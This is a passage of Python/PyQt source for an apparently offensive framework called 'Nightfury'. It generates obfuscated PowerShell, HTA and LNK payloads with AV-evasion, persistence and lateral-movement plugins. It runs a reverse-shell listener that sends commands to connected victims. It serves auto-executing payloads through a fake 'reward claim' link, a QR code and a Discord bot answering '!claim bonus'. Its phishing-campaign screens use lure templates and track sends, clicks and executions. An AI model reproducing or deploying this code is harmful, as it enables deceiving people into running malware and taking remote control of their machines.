        payload_preview_layout = QVBoxLayout()
        
        self.payload_preview = QTextEdit()
        self.payload_preview.setReadOnly(True)
        self.payload_preview.setPlaceholderText("Payload will appear here after generation")
        payload_preview_layout.addWidget(self.payload_preview)
        
        # Save buttons
        save_btn_layout = QHBoxLayout()
        self.save_btn = ModernButton("Save to File")
        self.save_btn.setEnabled(False)
        self.save_btn.clicked.connect(self.save_payload)
        save_btn_layout.addWidget(self.save_btn)
        
        self.copy_btn = ModernButton("Copy to Clipboard")
        self.copy_btn.setEnabled(False)
        self.copy_btn.clicked.connect(self.copy_payload)
        save_btn_layout.addWidget(self.copy_btn)
        
        self.test_btn = ModernButton("Test in Sandbox")
        self.test_btn.setEnabled(False)
        self.test_btn.clicked.connect(self.test_payload)
        save_btn_layout.addWidget(self.test_btn)
        
        payload_preview_layout.addLayout(save_btn_layout)
        payload_preview_group.setLayout(payload_preview_layout)
        layout.addWidget(payload_preview_group)
    
    def create_listener_tab(self):
        listener_tab = QWidget()
        layout = QVBoxLayout()
        listener_tab.setLayout(layout)
        self.tabs.addTab(listener_tab, "👂 Listener")
        
        # Listener controls
        controls_group = QGroupBox("Listener Controls")
        controls_layout = QHBoxLayout()
        
        self.start_btn = ModernButton("Start Listener")
        self.start_btn.clicked.connect(self.start_listener)
        controls_layout.addWidget(self.start_btn)
        
        self.stop_btn = ModernButton("Stop Listener")
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self.stop_listener)
        controls_layout.addWidget(self.stop_btn)
        
        controls_group.setLayout(controls_layout)
        layout.addWidget(controls_group)
        
        # Connection status
        status_group = QGroupBox("Connection Status")
        status_layout = QVBoxLayout()
        
        self.connection_status = QLabel("Listener not running")
        self.connection_status.setAlignment(Qt.AlignCenter)
        self.connection_status.setStyleSheet("font-weight: bold; font-size: 14px;")
        status_layout.addWidget(self.connection_status)
        
        # Splitter for connections and command execution
        splitter = QSplitter(Qt.Horizontal)
        
        # Connections list
        conn_widget = QWidget()
        conn_layout = QVBoxLayout()
        conn_layout.addWidget(QLabel("Active Connections:"))
        self.connections_list = QListWidget()
        conn_layout.addWidget(self.connections_list)
        conn_widget.setLayout(conn_layout)
        splitter.addWidget(conn_widget)
        
        # Command execution
        command_widget = QWidget()
        command_layout = QVBoxLayout()
        command_layout.addWidget(QLabel("Command Execution:"))
        
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("Enter command to execute on connected clients")
        self.command_input.setEnabled(False)
        command_layout.addWidget(self.command_input)
        
        self.send_btn = ModernButton("Send Command")
        self.send_btn.setEnabled(False)
        self.send_btn.clicked.connect(self.send_command)
        command_layout.addWidget(self.send_btn)
        
        self.command_output = QTextEdit()
        self.command_output.setReadOnly(True)
        self.command_output.setPlaceholderText("Command output will appear here")
        command_layout.addWidget(self.command_output)
        
        command_widget.setLayout(command_layout)
        splitter.addWidget(command_widget)
        
        # Set splitter sizes
        splitter.setSizes([300, 500])
        status_layout.addWidget(splitter)
        
        status_group.setLayout(status_layout)
        layout.addWidget(status_group)
    
    def create_auto_execute_tab(self):
        auto_tab = QWidget()
        layout = QVBoxLayout()
        auto_tab.setLayout(layout)
        self.tabs.addTab(auto_tab, "🚀 Auto-Execution")
        
        # Auto-Execute Server Section
        server_group = QGroupBox("Auto-Execute Server")
        server_layout = QVBoxLayout()
        
        server_info = QLabel("This server delivers payloads that auto-execute when users click the reward claim link")
        server_info.setWordWrap(True)
        server_layout.addWidget(server_info)
        
        # Server controls
        server_controls = QHBoxLayout()
        
        self.start_server_btn = ModernButton("Start Auto-Server")
        self.start_server_btn.clicked.connect(self.start_auto_server)
        server_controls.addWidget(self.start_server_btn)
        
        self.stop_server_btn = ModernButton("Stop Auto-Server")
        self.stop_server_btn.setEnabled(False)
        self.stop_server_btn.clicked.connect(self.stop_auto_server)
        server_controls.addWidget(self.stop_server_btn)
        
        server_layout.addLayout(server_controls)
        
        # Server URL display
        self.server_url = QLineEdit()
        self.server_url.setReadOnly(True)
        self.server_url.setPlaceholderText("Server URL will appear here after starting")
        server_layout.addWidget(self.server_url)
        
        # Copy URL button
        copy_url_btn = ModernButton("Copy Claim URL")
        copy_url_btn.clicked.connect(self.copy_claim_url)
        server_layout.addWidget(copy_url_btn)
        
        # QR code display
        self.qr_label = QLabel()
        self.qr_label.setAlignment(Qt.AlignCenter)
        self.qr_label.setMinimumSize(200, 200)
        server_layout.addWidget(self.qr_label)
        
        server_group.setLayout(server_layout)
        layout.addWidget(server_group)
        
        # Discord Bot Section
        discord_group = QGroupBox("Discord Command Integration")
        discord_layout = QVBoxLayout()
        
        discord_info = QLabel("The bot will respond to '!claim bonus' commands with an auto-execute link")
        discord_info.setWordWrap(True)
        discord_layout.addWidget(discord_info)
        
        # Bot controls
        bot_controls = QHBoxLayout()
        
        self.start_bot_btn = ModernButton("Start Discord Bot")
        self.start_bot_btn.clicked.connect(self.start_discord_bot)
        bot_controls.addWidget(self.start_bot_btn)
        
        self.stop_bot_btn = ModernButton("Stop Discord Bot")
        self.stop_bot_btn.setEnabled(False)
        self.stop_bot_btn.clicked.connect(self.stop_discord_bot)
        bot_controls.addWidget(self.stop_bot_btn)
        
        discord_layout.addLayout(bot_controls)
        
        # Bot status
        self.bot_status = QLabel("Bot status: Not running")
        discord_layout.addWidget(self.bot_status)
        
        discord_group.setLayout(discord_layout)
        layout.addWidget(discord_group)
        
        # Phishing Campaign Section
        phishing_group = QGroupBox("Phishing Campaign")
        phishing_layout = QVBoxLayout()
        
        phishing_info = QLabel("Create and manage phishing campaigns with tracking")
        phishing_info.setWordWrap(True)
        phishing_layout.addWidget(phishing_info)
        
        # Campaign controls
        campaign_controls = QHBoxLayout()
        
        self.create_campaign_btn = ModernButton("Create Campaign")
        self.create_campaign_btn.clicked.connect(self.create_campaign)
        campaign_controls.addWidget(self.create_campaign_btn)
        
        self.view_stats_btn = ModernButton("View Statistics")
        self.view_stats_btn.clicked.connect(self.view_campaign_stats)
        campaign_controls.addWidget(self.view_stats_btn)
        
        phishing_layout.addLayout(campaign_controls)
        
        phishing_group.setLayout(phishing_layout)
        layout.addWidget(phishing_group)
    
    def create_plugins_tab(self):
        plugins_tab = QWidget()
        layout = QVBoxLayout()
        plugins_tab.setLayout(layout)
        self.tabs.addTab(plugins_tab, "🔌 Plugins")
        
        # Plugin browser
        browser_group = QGroupBox("Available Plugins")
        browser_layout = QVBoxLayout()
        
        self.plugin_list = QListWidget()
        browser_layout.addWidget(self.plugin_list)
        
        browser_group.setLayout(browser_layout)
        layout.addWidget(browser_group)
        
        # Plugin controls
        controls_group = QGroupBox("Plugin Controls")
        controls_layout = QHBoxLayout()
        
        self.load_plugin_btn = ModernButton("Load Plugin")
        self.load_plugin_btn.clicked.connect(self.load_plugin)
        controls_layout.addWidget(self.load_plugin_btn)
        
        self.unload_plugin_btn = ModernButton("Unload Plugin")
        self.unload_plugin_btn.clicked.connect(self.unload_plugin)
        controls_layout.addWidget(self.unload_plugin_btn)
        
        self.configure_plugin_btn = ModernButton("Configure Plugin")
        self.configure_plugin_btn.clicked.connect(self.configure_plugin)
        controls_layout.addWidget(self.configure_plugin_btn)
        
        controls_group.setLayout(controls_layout)
        layout.addWidget(controls_group)
        
        # Plugin info
        info_group = QGroupBox("Plugin Information")
        info_layout = QVBoxLayout()
        
        self.plugin_info = QTextEdit()
        self.plugin_info.setReadOnly(True)
        self.plugin_info.setPlaceholderText("Plugin information will appear here")
        info_layout.addWidget(self.plugin_info)
        
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
    
    def apply_dark_theme(self):
        dark_palette = QPalette()
        dark_palette.setColor(QPalette.Window, QColor(40, 44, 52))
        dark_palette.setColor(QPalette.WindowText, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.Base, QColor(30, 32, 38))
        dark_palette.setColor(QPalette.AlternateBase, QColor(40, 44, 52))
        dark_palette.setColor(QPalette.ToolTipBase, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.ToolTipText, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.Text, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.Button, QColor(61, 142, 255))
        dark_palette.setColor(QPalette.ButtonText, QColor(255, 255, 255))
        dark_palette.setColor(QPalette.BrightText, Qt.red)
        dark_palette.setColor(QPalette.Highlight, QColor(61, 142, 255))
        dark_palette.setColor(QPalette.HighlightedText, Qt.black)
        
        self.setPalette(dark_palette)
        
        # Set style
        self.setStyleSheet("""
            QGroupBox {
                border: 1px solid #4a4a4a;
                border-radius: 8px;
                margin-top: 1ex;
                font-weight: bold;
                color: #61aeee;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #61aeee;
            }
            QTextEdit, QListWidget, QLineEdit {
                background-color: #282c34;
                color: #abb2bf;
                border: 1px solid #4a4a4a;
                border-radius: 5px;
                padding: 8px;
                font-family: 'Consolas';
            }
            QPushButton {
                background-color: #3d8eff;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 8px 16px;
                min-height: 30px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #5a9cff;
            }
            QPushButton:disabled {
                background-color: #555;
            }
            QTabWidget::pane {
                border: 1px solid #4a4a4a;
                background: #282c34;
            }
            QTabBar::tab {
                background: #282c34;
                color: #abb2bf;
                padding: 10px;
                border: 1px solid #4a4a4a;
                border-bottom: none;
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
                font-weight: bold;
            }
            QTabBar::tab:selected {
                background: #3d8eff;
                color: white;
                border-color: #4a4a4a;
            }
            QProgressBar {
                border: 1px solid #4a4a4a;
                border-radius: 5px;
                text-align: center;
                background: #282c34;
                height: 20px;
            }
            QProgressBar::chunk {
                background-color: #3d8eff;
                width: 10px;
            }
            QStatusBar {
                background: #21252b;
                color: #abb2bf;
                padding: 4px;
            }
            QToolBar {
                background: #21252b;
                border: none;
                spacing: 5px;
            }
            QToolButton {
                background: #3d8eff;
                color: white;
                border: none;
                border-radius: 4px;
                padding: 5px;
            }
            QToolButton:hover {
                background: #5a9cff;
            }
            QSplitter::handle {
                background: #4a4a4a;
            }
        """)
    
    def show_banner(self):
        banner = """
  ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███████╗██╗   ██╗██████╗ ██╗   ██╗
  ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██║   ██║██╔══██╗╚██╗ ██╔╝
  ██╔██╗ ██║██║██║  ███╗███████║   ██║   █████╗  ██║   ██║██████╔╝ ╚████╔╝ 
  ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██╔══╝  ██║   ██║██╔══██╗  ╚██╔╝  
  ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║     ╚██████╔╝██║  ██║   ██║   
  ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
  
  Version 5.0 - OWASP Enhanced Edition
  Advanced Payload Framework with Multi-Platform Support
        """
        print(banner)
    
    def setup_system_tray(self):
        if not QSystemTrayIcon.isSystemTrayAvailable():
            return
            
        self.tray_icon = QSystemTrayIcon(self)
        self.tray_icon.setIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
        
        tray_menu = QMenu()
        
        show_action = QAction("Show", self)
        show_action.triggered.connect(self.show)
        tray_menu.addAction(show_action)
        
        hide_action = QAction("Hide", self)
        hide_action.triggered.connect(self.hide)
        tray_menu.addAction(hide_action)
        
        tray_menu.addSeparator()
        
        quit_action = QAction("Quit", self)
        quit_action.triggered.connect(QApplication.quit)
        tray_menu.addAction(quit_action)
        
        self.tray_icon.setContextMenu(tray_menu)
        self.tray_icon.show()
    
    def load_plugins(self):
        # Load built-in plugins
        # This is a placeholder - in a real implementation, you would scan a plugins directory
        self.plugin_manager.register_plugin("AV Evasion", AVEvasionPlugin)
        self.plugin_manager.register_plugin("Persistence", PersistencePlugin)
        self.plugin_manager.register_plugin("Lateral Movement", LateralMovementPlugin)
        
        # Populate plugin list
        for plugin_name in self.plugin_manager.list_plugins():
            self.plugin_list.addItem(plugin_name)
    
    def load_plugin(self):
        selected_items = self.plugin_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a plugin to load")
            return
            
        plugin_name = selected_items[0].text()
        plugin = self.plugin_manager.load_plugin(plugin_name, self)
        
        if plugin:
            self.plugin_info.setText(f"Loaded plugin: {plugin.name}\nVersion: {plugin.version}\n\n{plugin.description}")
            self.activity_list.addItem(f"[+] Loaded plugin: {plugin.name}")
        else:
            QMessageBox.warning(self, "Error", f"Failed to load plugin: {plugin_name}")
    
    def unload_plugin(self):
        selected_items = self.plugin_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a plugin to unload")
            return
            
        plugin_name = selected_items[0].text()
        if plugin_name in self.plugin_manager.loaded_plugins:
            del self.plugin_manager.loaded_plugins[plugin_name]
            self.plugin_info.clear()
            self.activity_list.addItem(f"[-] Unloaded plugin: {plugin_name}")
        else:
            QMessageBox.warning(self, "Error", f"Plugin {plugin_name} is not loaded")
    
    def configure_plugin(self):
        selected_items = self.plugin_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a plugin to configure")
            return
            
        plugin_name = selected_items[0].text()
        plugin = self.plugin_manager.get_plugin(plugin_name)
        
        if plugin:
            # Show plugin configuration dialog
            dialog = QDialog(self)
            dialog.setWindowTitle(f"Configure {plugin.name}")
            dialog.setModal(True)
            dialog.setMinimumWidth(400)
            
            layout = QVBoxLayout()
            layout.addWidget(QLabel(f"Configuration options for {plugin.name}"))
            
            # Add plugin-specific configuration options here
            
            buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
            buttons.accepted.connect(dialog.accept)
            buttons.rejected.connect(dialog.reject)
            layout.addWidget(buttons)
            
            dialog.setLayout(layout)
            
            if dialog.exec_() == QDialog.Accepted:
                self.activity_list.addItem(f"[*] Configured plugin: {plugin.name}")
        else:
            QMessageBox.warning(self, "Error", f"Plugin {plugin_name} is not loaded")
    
    def create_campaign(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Create Phishing Campaign")
        dialog.setModal(True)
        dialog.setMinimumWidth(500)
        
        layout = QVBoxLayout()
        
        form_layout = QFormLayout()
        
        campaign_name = QLineEdit()
        campaign_name.setPlaceholderText("Enter campaign name")
        form_layout.addRow("Campaign Name:", campaign_name)
        
        target_email = QLineEdit()
        target_email.setPlaceholderText("Enter target email address")
        form_layout.addRow("Target Email:", target_email)
        
        subject = QLineEdit()
        subject.setPlaceholderText("Enter email subject")
        form_layout.addRow("Subject:", subject)
        
        template = QComboBox()
        template.addItems(["Reward Notification", "Security Alert", "Password Reset", "Invoice"])
        form_layout.addRow("Template:", template)
        
        layout.addLayout(form_layout)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        buttons.accepted.connect(dialog.accept)
        buttons.rejected.connect(dialog.reject)
        layout.addWidget(buttons)
        
        dialog.setLayout(layout)
        
        if dialog.exec_() == QDialog.Accepted:
            self.activity_list.addItem(f"[+] Created phishing campaign: {campaign_name.text()}")
            QMessageBox.information(self, "Success", "Phishing campaign created successfully")
    
    def view_campaign_stats(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Campaign Statistics")
        dialog.setModal(True)
        dialog.setMinimumSize(600, 400)
        
        layout = QVBoxLayout()
        
        # Create a simple table with mock data
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["Campaign", "Sent", "Clicked", "Executed"])
        
        # Add some mock data
        table.setRowCount(3)
        table.setItem(0, 0, QTableWidgetItem("Reward Campaign"))
        table.setItem(0, 1, QTableWidgetItem("100"))
        table.setItem(0, 2, QTableWidgetItem("45"))
        table.setItem(0, 3, QTableWidgetItem("22"))
        
        table.setItem(1, 0, QTableWidgetItem("Security Alert"))
        table.setItem(1, 1, QTableWidgetItem("80"))
        table.setItem(1, 2, QTableWidgetItem("32"))
        table.setItem(1, 3, QTableWidgetItem("15"))
        
        table.setItem(2, 0, QTableWidgetItem("Password Reset"))
        table.setItem(2, 1, QTableWidgetItem("120"))
        table.setItem(2, 2, QTableWidgetItem("65"))
        table.setItem(2, 3, QTableWidgetItem("38"))
        
        table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        layout.addWidget(table)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Close)
        buttons.rejected.connect(dialog.reject)
        layout.addWidget(buttons)
        
        dialog.setLayout(layout)
        dialog.exec_()
    
    def test_payload(self):
        if not self.current_payload:
            QMessageBox.warning(self, "Warning", "No payload generated to test")
            return
            
        dialog = QDialog(self)
        dialog.setWindowTitle("Test Payload in Sandbox")
        dialog.setModal(True)
        dialog.setMinimumWidth(400)
        
        layout = QVBoxLayout()
        layout.addWidget(QLabel("Testing payload in isolated environment..."))
        
        progress = QProgressBar()
        progress.setRange(0, 0)  # Indeterminate progress
        layout.addWidget(progress)
        
        result = QLabel()
        result.setWordWrap(True)
        layout.addWidget(result)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Ok)
        buttons.accepted.connect(dialog.accept)
        buttons.setEnabled(False)
        layout.addWidget(buttons)
        
        dialog.setLayout(layout)
        
        # Simulate testing process
        def update_test():
            time.sleep(3)  # Simulate testing time
            result.setText("✅ Payload passed basic evasion tests\n\n❌ Detected by 2/26 AV engines\n\n⚠️  Recommend increasing obfuscation level")
            progress.setRange(0, 100)
            progress.setValue(100)
            buttons.setEnabled(True)
            
        threading.Thread(target=update_test, daemon=True).start()
        
        dialog.exec_()
    
    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org').text
        except:
            return "127.0.0.1"
    
    def save_config(self):
        try:
            self.config['lhost'] = self.lhost_input.text()
            self.config['lport'] = int(self.lport_input.text())
            self.config['auto_server_port'] = int(self.server_port_input.text())
            self.config['domain'] = self.domain_input.text()
            self.config['obfuscation_level'] = self.obf_level.currentIndex() + 1
            self.config['persistence'] = self.persistence_cb.isChecked()
            self.config['evasion_techniques'] = self.evasion_cb.isChecked()
            self.config['platform'] = self.platform_combo.currentText().lower()
            self.config['payload_type'] = self.payload_type_combo.currentText().lower().replace(' ', '_')
            self.config['discord_token'] = self.discord_token_input.text()
            self.config['auto_start_server'] = self.auto_server_cb.isChecked()
            self.config['auto_start_bot'] = self.auto_bot_cb.isChecked()
            
            self.status_bar.showMessage("✅ Configuration saved", 3000)
            self.activity_list.addItem("[*] Configuration saved")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def generate_payload(self, platform=None):
        try:
            self.save_config()
            
            target_platform = platform or self.config['platform']
            payload = NightfuryPayload(
                self.config['lhost'],
                self.config['lport'],
                self.config['obfuscation_level'],
                self.config['persistence'],
                self.config['evasion_techniques'],
                target_platform,
                self.config['payload_type']
            )
            self.current_payload = payload.generate()
            
            # Display payload
            self.payload_preview.setPlainText(self.current_payload)
            self.save_btn.setEnabled(True)
            self.copy_btn.setEnabled(True)
            self.test_btn.setEnabled(True)
            
            self.status_bar.showMessage("✅ Payload generated successfully", 3000)
            self.activity_list.addItem(f"[+] Generated {target_platform} payload")
            
            # Update payload count
            current_count = int(self.payload_count.text())
            self.payload_count.setText(str(current_count + 1))
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def generate_hta(self):
        try:
            self.save_config()
            
            payload = NightfuryPayload(
                self.config['lhost'],
                self.config['lport'],
                self.config['obfuscation_level'],
                self.config['persistence'],
                self.config['evasion_techniques'],
                "windows",
                self.config['payload_type']
            )
            hta_content = payload.generate_hta()
            self.current_payload = hta_content
            
            # Display HTA content
            self.payload_preview.setPlainText(self.current_payload)
            self.save_btn.setEnabled(True)
            self.copy_btn.setEnabled(True)
            self.test_btn.setEnabled(True)
            
            self.status_bar.showMessage("✅ HTA payload generated successfully", 3000)
            self.activity_list.addItem("[+] Generated HTA payload")
            
            # Update payload count
            current_count = int(self.payload_count.text())
            self.payload_count.setText(str(current_count + 1))
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def generate_lnk(self):
        try:
            self.save_config()
            
            payload = NightfuryPayload(
                self.config['lhost'],
                self.config['lport'],
                self.config['obfuscation_level'],
                self.config['persistence'],
                self.config['evasion_techniques'],
                "windows",
                self.config['payload_type']
            )
            
            # Generate LNK file
            filename, _ = QFileDialog.getSaveFileName(
                self, "Save LNK File", "Shortcut.lnk", "Shortcut Files (*.lnk)"
            )
            
            if filename:
                lnk_path = payload.generate_lnk(filename)
                self.current_payload = f"LNK file generated at: {lnk_path}"
                
                # Display LNK info
                self.payload_preview.setPlainText(self.current_payload)
                self.save_btn.setEnabled(False)  # Already saved
                self.copy_btn.setEnabled(False)
                self.test_btn.setEnabled(True)
                
                self.status_bar.showMessage("✅ LNK payload generated successfully", 3000)
                self.activity_list.addItem("[+] Generated LNK payload")
                
                # Update payload count
                current_count = int(self.payload_count.text())
                self.payload_count.setText(str(current_count + 1))
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def save_payload(self):
        try:
            if not self.current_payload:
                raise Exception("No payload generated")
            
            filename, _ = QFileDialog.getSaveFileName(
                self, "Save Payload", "payload.ps1", "PowerShell Scripts (*.ps1);;All Files (*)"
            )
            
            if filename:
                with open(filename, "w") as f:
                    f.write(self.current_payload)
                self.status_bar.showMessage(f"✅ Payload saved to {filename}", 5000)
                self.activity_list.addItem(f"[+] Payload saved to {filename}")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def copy_payload(self):
        try:
            if not self.current_payload:
                raise Exception("No payload generated")
            
            clipboard = QApplication.clipboard()
            clipboard.setText(self.current_payload)
            self.status_bar.showMessage("✅ Payload copied to clipboard", 3000)
            self.activity_list.addItem("[+] Payload copied to clipboard")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def start_listener(self):
        try:
            self.save_config()
            
            if not self.config['lhost'] or not self.config['lport']:
                raise Exception("Please configure LHOST and LPORT first")
            
            # Create listener socket
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener_socket.bind((self.config['lhost'], self.config['lport']))
            self.listener_socket.listen(5)
            
            # Start listener thread
            self.listener_thread = threading.Thread(target=self.listen_for_connections, daemon=True)
            self.listener_thread.start()
            
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.command_input.setEnabled(True)
            self.send_btn.setEnabled(True)
            self.connection_status.setText(f"🟢 Listening on {self.config['lhost']}:{self.config['lport']}")
            self.connection_status.setStyleSheet("color: green; font-weight: bold; font-size: 14px;")
            self.activity_list.addItem(f"[+] Listener started on {self.config['lhost']}:{self.config['lport']}")
            
            self.status_bar.showMessage("✅ Listener started", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Listener error: {str(e)}", 5000)
    
    def listen_for_connections(self):
        while True:
            try:
                client_socket, addr = self.listener_socket.accept()
                ip, port = addr
                
                # Add to active connections
                self.active_connections.append({
                    'socket': client_socket,
                    'address': f"{ip}:{port}",
                    'active': True
                })
                
                # Update UI
                self.activity_list.addItem(f"[+] New connection from {ip}:{port}")
                self.connections_list.addItem(f"{ip}:{port}")
                
                # Start client handler
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, f"{ip}:{port}"),
                    daemon=True
                )
                client_thread.start()
            except:
                break
    
    def handle_client(self, client_socket, client_id):
        try:
            # Send initial prompt
            if self.config['platform'] == "windows":
                client_socket.send(b"PS C:\\> ")
            else:
                client_socket.send(b"$ ")
            
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                
                try:
                    # Execute command
                    cmd = data.decode().strip()
                    if cmd.lower() == "exit":
                        break
                    
                    self.command_output.append(f"[{client_id}] > {cmd}")
                    
                    # Run command and capture output
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    output = result.stdout + result.stderr
                    
                    if self.config['platform'] == "windows":
                        output += f"\nPS {os.getcwd()}> "
                    else:
                        output += f"\n$ "
                except Exception as e:
                    if self.config['platform'] == "windows":
                        output = f"Error: {str(e)}\nPS {os.getcwd()}> "
                    else:
                        output = f"Error: {str(e)}\n$ "
                
                client_socket.send(output.encode())
                self.command_output.append(f"[{client_id}] {output}")
        except:
            pass
        
        # Remove connection
        self.activity_list.addItem(f"[-] Connection closed: {client_id}")
        for i, conn in enumerate(self.active_connections):
            if conn['address'] == client_id:
                self.active_connections.pop(i)
                break
        
        # Remove from UI
        items = self.connections_list.findItems(client_id, Qt.MatchExactly)
        for item in items:
            row = self.connections_list.row(item)
            self.connections_list.takeItem(row)
        
        client_socket.close()
    
    def stop_listener(self):
        try:
            # Close all client sockets
            for conn in self.active_connections:
                try:
                    conn['socket'].close()
                except:
                    pass
            
            # Close listener socket
            self.listener_socket.close()
            self.active_connections = []
            
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.command_input.setEnabled(False)
            self.send_btn.setEnabled(False)
            self.connection_status.setText("🔴 Listener stopped")
            self.connection_status.setStyleSheet("color: red; font-weight: bold; font-size: 14px;")
            self.activity_list.addItem("[+] Listener stopped")
            
            # Clear connections list
            self.connections_list.clear()
            
            self.status_bar.showMessage("✅ Listener stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping listener: {str(e)}", 5000)
    
    def send_command(self):
        try:
            command = self.command_input.text().strip()
            if not command:
                return
            
            # Get selected connection
            selected_items = self.connections_list.selectedItems()
            if not selected_items:
                raise Exception("Select a connection first")
            
            client_id = selected_items[0].text()
            
            # Find client socket
            for conn in self.active_connections:
                if conn['address'] == client_id:
                    conn['socket'].send(f"{command}\n".encode())
                    self.command_output.append(f"[{client_id}] > {command}")
                    self.command_input.clear()
                    return
            
            raise Exception("Connection not found")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def start_auto_server(self):
        try:
            self.save_config()
            
            if not self.config['lhost'] or not self.config['lport']:
                raise Exception("Configure LHOST and LPORT first")
            
            # Create HTTP server with custom parameters
            server_address = ('', self.config['auto_server_port'])
            
            # Create a custom handler class with our config
            class CustomHandler(AutoExecutionServer):
                pass
                
            setattr(CustomHandler, 'server', self)
            setattr(CustomHandler, 'lhost', self.config['lhost'])
            setattr(CustomHandler, 'lport', self.config['lport'])
            setattr(CustomHandler, 'obfuscation_level', self.config['obfuscation_level'])
            setattr(CustomHandler, 'persistence', self.config['persistence'])
            setattr(CustomHandler, 'evasion_techniques', self.config['evasion_techniques'])
            setattr(CustomHandler, 'platform', self.config['platform'])
            setattr(CustomHandler, 'domain', self.config['domain'])
            
            self.http_server = HTTPServer(server_address, CustomHandler)
            self.http_server.is_running = True
            
            # Start server in a separate thread
            server_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
            server_thread.start()
            
            self.start_server_btn.setEnabled(False)
            self.stop_server_btn.setEnabled(True)
            
            # Generate claim URL
            claim_url = f"http://{self.config['domain']}:{self.config['auto_server_port']}/"
            self.server_url.setText(claim_url)
            
            # Generate QR code
            qr = qrcode.QRCode()
            qr.add_data(claim_url)
            qr_img = qr.make_image(fill_color="black", back_color="white")
            
            # Convert to QPixmap
            img_byte_arr = io.BytesIO()
            qr_img.save(img_byte_arr, format='PNG')
            qpixmap = QPixmap()
            qpixmap.loadFromData(img_byte_arr.getvalue())
            self.qr_label.setPixmap(qpixmap)
            
            self.activity_list.addItem(f"[+] Auto-server started: {claim_url}")
            self.server_status.setText("Running")
            self.server_status.setStyleSheet("color: green; font-weight: bold; font-size: 24px;")
            self.status_bar.showMessage(f"✅ Auto-server started on port {self.config['auto_server_port']}", 5000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Server error: {str(e)}", 5000)
    
    def stop_auto_server(self):
        try:
            if self.http_server:
                self.http_server.shutdown()
                self.http_server.server_close()
                
                self.start_server_btn.setEnabled(True)
                self.stop_server_btn.setEnabled(False)
                self.server_url.clear()
                self.qr_label.clear()
                
                self.activity_list.addItem("[+] Auto-server stopped")
                self.server_status.setText("Stopped")
                self.server_status.setStyleSheet("color: red; font-weight: bold; font-size: 24px;")
                self.status_bar.showMessage("✅ Auto-server stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping server: {str(e)}", 5000)
    
    def copy_claim_url(self):
        try:
            if self.server_url.text():
                clipboard = QApplication.clipboard()
                clipboard.setText(self.server_url.text())
                self.status_bar.showMessage("✅ Claim URL copied to clipboard", 3000)
                self.activity_list.addItem("[+] Claim URL copied to clipboard")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def start_discord_bot(self):
        try:
            self.save_config()
            
            if not self.config['discord_token']:
                raise Exception("Enter Discord token")
            
            # Create and start Discord bot
            intents = discord.Intents.default()
            intents.message_content = True
            intents.members = True
            
            self.discord_bot = commands.Bot(
                command_prefix='!',
                intents=intents
            )
            
            @self.discord_bot.event
            async def on_ready():
                self.bot_status.setText("Bot status: ✅ Connected")
                self.bot_status_dash.setText("Running")
                self.bot_status_dash.setStyleSheet("color: green; font-weight: bold; font-size: 24px;")
                self.activity_list.addItem("[+] Discord bot connected")
            
            @self.discord_bot.command()
            async def claim(ctx):
                # Generate a unique claim token
                claim_token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                claim_url = f"http://{self.config['domain']}:{self.config['auto_server_port']}/?token={claim_token}"
                
                # Create embed message
